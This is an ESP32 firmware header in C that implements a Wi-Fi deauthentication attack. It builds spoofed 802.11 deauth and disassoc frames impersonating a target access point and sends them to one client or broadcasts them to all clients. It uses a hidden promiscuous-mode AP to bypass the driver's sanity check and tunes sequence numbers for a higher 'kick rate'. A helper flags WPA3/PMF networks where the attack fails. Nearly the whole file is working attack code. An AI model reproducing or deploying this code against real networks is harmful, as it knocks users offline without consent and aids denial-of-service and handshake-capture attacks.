/*
 * wifi_deauth_frame — shared 802.11 deauth/disassoc frame builder.
 *
 * Addressing follows the 802.11-2016 mgmt frame layout:
 *   addr1 = destination (either broadcast FF:FF:...FF or the client STA MAC)
 *   addr2 = transmitter / BSSID being impersonated
 *   addr3 = BSSID
 *
 * Every invocation fires a deauth (subtype 0xC0, reason 7) *and* a disassoc
 * (subtype 0xA0, reason 8). This mirrors aircrack-ng `--deauth`, ESP32
 * Marauder, and Ghost ESP — some client drivers ignore deauth but honor
 * disassoc, and vice versa. Sending the pair improves kick rate against a
 * wider range of targets.
 *
 * The sequence number is caller-owned and incremented per frame. A static
 * zero sequence number causes some APs and modern client drivers to treat
 * every frame as a duplicate of the previous one — they rate-limit or drop.
 *
 * esp_wifi_80211_tx is called with en_sys_seq=false so the sequence we
 * stamp is the one that goes on air. If a patched WiFi blob is present
 * (see docs/deauth-injection-patch.md) the frames leave the chip as
 * written. On stock IDF some frames may be dropped at the TX FIFO —
 * return value tracks actual sends.
 *
 * Returns: number of frames the driver accepted (0, 1, or 2).
 */
#pragma once

#include <Arduino.h>
#include <esp_wifi.h>
#include <string.h>

/*
 * Marauder-style "silent AP" mode for raw TX.
 *
 * Stock ESP-IDF blob rejects esp_wifi_80211_tx on WIFI_IF_STA for MGMT
 * subtypes 0xC (deauth) and 0xA (disassoc). BUT in WIFI_MODE_AP with
 * promiscuous=true, the blob doesn't enforce its addr2-matching sanity
 * check — frames with spoofed-BSSID addr2 transmit freely via WIFI_IF_AP.
 *
 * Config matches ESP32Marauder's WiFiScan.cpp (4440-4480):
 *   - WIFI_MODE_AP only (not AP_STA)
 *   - storage=RAM so we don't NVS-persist the silent AP
 *   - SSID empty, hidden, max_connection=0
 *   - beacon_interval=60000 (60 seconds — minimize real beacon noise on air)
 *   - promiscuous mode on
 *
 * No MAC spoofing required — the blob doesn't care in AP+promisc combo.
 *
 * Call wifi_silent_ap_begin() at deauth feature entry, end on exit.
 */
static inline esp_err_t wifi_silent_ap_begin(uint8_t channel)
{
    esp_wifi_stop();
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_AP);

    wifi_config_t conf = {};
    conf.ap.ssid[0] = '\0';
    conf.ap.ssid_len = 0;
    conf.ap.channel = channel ? channel : 1;
    conf.ap.ssid_hidden = 1;
    conf.ap.max_connection = 0;
    conf.ap.beacon_interval = 60000;  /* 60s — keeps our AP nearly silent */
    conf.ap.authmode = WIFI_AUTH_OPEN;

    esp_err_t rc = esp_wifi_set_config(WIFI_IF_AP, &conf);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);   /* required for raw TX on AP iface */
    if (channel) {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }
    delay(80);
    return rc;
}

static inline void wifi_silent_ap_end(void)
{
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    delay(150);
}

static inline void _deauth_stamp_seq(uint8_t *f, uint16_t seq)
{
    uint16_t s = seq & 0x0FFF;
    /* Seq Control = (SeqNum << 4) | FragNum, little-endian */
    f[22] = (uint8_t)((s & 0x000F) << 4);
    f[23] = (uint8_t)((s >> 4) & 0xFF);
}

/*
 * Fire one deauth + one disassoc at `dst` spoofed from `bssid`.
 * `seq` is a caller-owned counter, incremented twice (once per frame).
 */
static inline int wifi_deauth_pair(const uint8_t dst[6],
                                   const uint8_t bssid[6],
                                   uint16_t *seq)
{
    uint8_t f[26];
    /* Frame Control */
    f[0] = 0xC0;  /* type=mgmt, subtype=deauth */
    f[1] = 0x00;
    /* Duration */
    f[2] = 0x3A; /* 58us — borrowed from aircrack-ng default */
    f[3] = 0x01;
    /* Addresses */
    memcpy(f + 4,  dst,   6);
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
    /* Sequence */
    _deauth_stamp_seq(f, (*seq)++);
    /* Reason code 7: class 3 frame received from nonassociated STA */
    f[24] = 0x07;
    f[25] = 0x00;

    int ok = 0;
    /* TX via WIFI_IF_AP with en_sys_seq=false. Caller must have called
     * wifi_silent_ap_begin() to put WiFi in AP+promisc mode. Matches
     * ESP32Marauder's sendDeauthFrame pattern byte-for-byte. */
    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
    if (rc == ESP_OK) ok++;
    else {
        static uint32_t _last_tx_err_log = 0;
        if (millis() - _last_tx_err_log > 1000) {
            Serial.printf("[80211_tx] deauth rc=%d (0x%x)\n", (int)rc, (unsigned)rc);
            _last_tx_err_log = millis();
        }
    }

    /* Same frame, different subtype + reason = disassoc pair. */
    f[0] = 0xA0;  /* subtype=disassoc */
    _deauth_stamp_seq(f, (*seq)++);
    f[24] = 0x08;  /* reason 8: disassociated due to inactivity */
    f[25] = 0x00;

    rc = esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
    if (rc == ESP_OK) ok++;
    return ok;
}

/*
 * One broadcast pair targeting every STA associated to `bssid`.
 */
static inline int wifi_deauth_broadcast(const uint8_t bssid[6], uint16_t *seq)
{
    static const uint8_t BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    return wifi_deauth_pair(BCAST, bssid, seq);
}

/*
 * PMF/WPA3 hint. Returns true if the auth mode is known to use Protected
 * Management Frames — in which case plain deauth/disassoc is
 * cryptographically dropped and this attack won't land.
 *
 * `auth` comes from ap_t.auth which is `(uint8_t)WiFi.encryptionType(i)`.
 * The numeric values are stable across IDF versions: WPA3_PSK=6,
 * WPA2_WPA3_PSK=7, ENTERPRISE(WPA2-Ent)=5, WPA3_ENT_192=10.
 */
static inline bool wifi_auth_has_pmf(uint8_t auth)
{
    /* PMF-mandatory or PMF-capable auth modes. Numeric values match
     * wifi_auth_mode_t across IDF 4.x / 5.x. */
    switch (auth) {
        case 5:   /* WIFI_AUTH_ENTERPRISE (WPA2-Enterprise) */
        case 6:   /* WIFI_AUTH_WPA3_PSK */
        case 7:   /* WIFI_AUTH_WPA2_WPA3_PSK — WPA3-transition, PMF required */
        case 10:  /* WIFI_AUTH_WPA3_ENT_192 */
        case 11:  /* WIFI_AUTH_WPA3_EXT_PSK */
        case 12:  /* WIFI_AUTH_WPA3_EXT_PSK_MIXED_MODE */
            return true;
        default:
            return false;
    }
}
